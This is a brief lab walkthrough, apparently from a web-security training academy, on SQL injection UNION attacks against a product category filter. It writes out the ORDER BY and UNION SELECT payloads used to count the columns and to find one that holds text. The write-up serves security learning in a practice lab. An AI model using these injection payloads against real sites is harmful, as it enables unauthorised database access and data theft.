# SQL injection UNION attack, finding a column containing text

1. SQLi: product category filter.
2. Goal:
    - determine the number of columns.
    - identify a column that is compatible with string data.

### Analysis
- Website target: `https://0a5100760463bde9809612ee00300062.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 3--
'-- I found 3 columns.
```

2. Find the data type of these columns.
```sql
' union select null, 'a', null--
'-- I found some strings on the page: g72GkI

' union select null, 'g72GkI', null--
```